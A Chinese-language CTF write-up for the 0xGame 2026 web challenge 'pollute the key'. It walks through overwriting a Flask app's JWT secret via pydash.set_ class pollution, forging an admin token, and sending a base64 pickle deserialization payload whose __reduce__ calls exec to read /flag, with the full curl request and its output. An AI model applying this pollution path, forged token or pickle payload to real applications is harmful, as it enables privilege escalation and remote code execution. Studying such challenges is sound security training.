# pollute the key

注册这样一个账号后来到个人中心：

![](1.jpg)

![](2.jpg)

交点数据上去，看一看“保存修改”发的请求：

![](3.jpg)

![](4.jpg)

- `/api/user/update`

![](5.jpg)

- `{"key":"email","value":"508228021@qq.com"}`

返回：

```json
200 {
  "msg": "资料已更新",
  "ok": true,
  "profile": {
    "email": "508228021@qq.com",
    "nickname": "",
    "phone": "",
    "role": "user",
    "username": "scetayh"
  }
}
```

![](6.jpg)

我看 `app.py` 里边有 JWT encode / decode ，每次都要调用 `_secret()` 函数，这个函数返回的是被 `import` 进来的全局变量 `SECRET_KEY` ，也就是说要想做点什么，首先要拿到管理员权限，也就是要拿到管理员的 JWT ，但显然我们不知道 `SECRET_KEY`。好在它作为全局变量可以修改：

```python
from runtime_secrets import SECRET_KEY, rotate_flag
```

考虑网页提供的修改字段值的功能，它的后端实现是这样的：

```python
pydash.set_(me, key, value)
```

这里的 `me` 是：

```python
me = USERS.get(payload.get("username"))
```

`USERS` 字典中的一个 `User` 对象。那么获取后者：

```python
me.__class__ # User
```

而 `User` 的定义是：

```python
class User:
    def __init__(
        self, username, password, role="user", email="", phone="", nickname=""
    ):
        # ...

    def profile(self):
        # ...
```

拿到它的 `__init__` 方法（ `profile` 也行）：

```python
me.__class__.__init__ # __init__
```

然后顺利拿到全局变量 `SECRET_KEY`：

```python
me.__class__.__init__.__globals__.SECRET_KEY
```

`pydash.set_()` 第一个参数是 `me` ，所以第二个参数应该写：

```python
__class__.__init__.__globals__.SECRET_KEY
```

把这个作为键、任意字符串（这里用 `tarikko` ）作为值输进网页并“保存修改”：

![](7.jpg)

然后去 [JSON Web Tokens](https://www.jwt.io/) encode 一个 token 出来。看看后端要求哪些字段：

```python
@app.route("/api/login", methods=["POST"])
def api_login():
    # ...
    payload = {
        "username": user.username,
        "role": user.role,
        "iat": now,
        "exp": now + JWT_TTL,
    }

# ...

@app.route("/api/order/buy", methods=["POST"])
def api_order_buy():
    # ...
    if payload.get("role") != "admin":
        return jsonify({"ok": False, "msg": "下单结算仅对管理员（admin）开放"}), 403
```

所以：

```json
{
    "username": "scetayh",
    "role": "admin",
    "iat": "1791001349",
    "exp": "1791011349"
}
```

![](8.jpg)

拿到 token ：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNjZXRheWgiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOiIxNzkxMDAxMzQ5IiwiZXhwIjoiMTc5MTAxMTM0OSJ9.yOd0Lgo8L8ZTmJT60wYyAdXzJoiJZU7oyi-kYt3uagc
```

点进商店，打开开发者工具“网络”，修改 token 并刷新页面：

![](9.jpg)

![](10.jpg)

拿到权限后向下翻：

![](11.jpg)

看看示例：

![](12.jpg)

```json
200 {"msg":"\u4e0b\u5355\u6210\u529f","ok":true,"order":{"items":["\u65d7\u8230\u7248\u673a\u68b0\u952e\u76d8","4K \u663e\u793a\u5668 27\u5bf8"],"order_id":"SO349066519","total":2798.0,"ts":1791001857,"username":"scetayh"}}
```

格式化后：

```json
200 {
    "msg": "\u4e0b\u5355\u6210\u529f",
    "ok": true,
    "order": {
        "items": [
            "\u65d7\u8230\u7248\u673a\u68b0\u952e\u76d8",
            "4K \u663e\u793a\u5668 27\u5bf8"
        ],
        "order_id": "SO349066519",
        "total": 2798.0,
        "ts": 1791001857,
        "username": "scetayh"
    }
}
```

转到后端实现：

```python
@app.route("/shop")
def shop():
    # ...
        demo_cart = base64.b64encode(
            pickle.dumps([p["id"] for p in PRODUCTS[:2]], protocol=0)
        ).decode()
    # ...
```

它把购物车内商品的 ID 列表序列化，又经过 Base64 编码才得到最终结果。将来反序列化：

```python
@app.route("/api/order/buy", methods=["POST"])
def api_order_buy():
    # ...
    try:
        cart = pickle.loads(base64.b64decode(raw))
    except Exception as e:
        return jsonify({"ok": False, "msg": "购物车数据无法解析: %s" % e}), 400
    # ...
```

所以用反序列化攻击。注意到这儿会显示一个 exception ，所以很适合拿来显示 flag ：

```python
import pickle
import base64

class GetFlag:
    def __reduce__(self):
        return (exec, ('raise Exception(open("/flag").read())', ))

payload = base64.b64encode(
    pickle.dumps(GetFlag(), protocol=0)
).decode()

print(payload)
```

运行得到 Base64 编码：

```
Y19fYnVpbHRpbl9fCmV4ZWMKcDAKKFZyYWlzZSBFeGNlcHRpb24ob3BlbigiL2ZsYWciKS5yZWFkKCkpCnAxCnRwMgpScDMKLg==
```

然后给它发出去：

```bash
(base) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups $ curl -X POST 'http://5000-b1bc5cfe-99aa-4aa5-9de6-09c035d1a9fe.challenge.ctfplus.cn/api/order/buy' -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNjZXRheWgiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOiIxNzkxMDAxMzQ5IiwiZXhwIjoiMTc5MTAxMTM0OSJ9.yOd0Lgo8L8ZTmJ
T60wYyAdXzJoiJZU7oyi-kYt3uagc' --data-urlencode 'cart=Y19fYnVpbHRpbl9fCmV4ZWMKcDAKKFZyYWlzZSBFeGNlcHRpb24ob3BlbigiL2ZsYWciKS5yZWFkKCkpCnAxCnRwMgpScDMKLg=='
{"msg":"\u8d2d\u7269\u8f66\u6570\u636e\u65e0\u6cd5\u89e3\u6790: 0xGame{0097d97f-fffe-4c5d-8a19-a7e7d849dbae}\n","ok":false}
```

从而得到 flag 为：

```
0xGame{0097d97f-fffe-4c5d-8a19-a7e7d849dbae}
```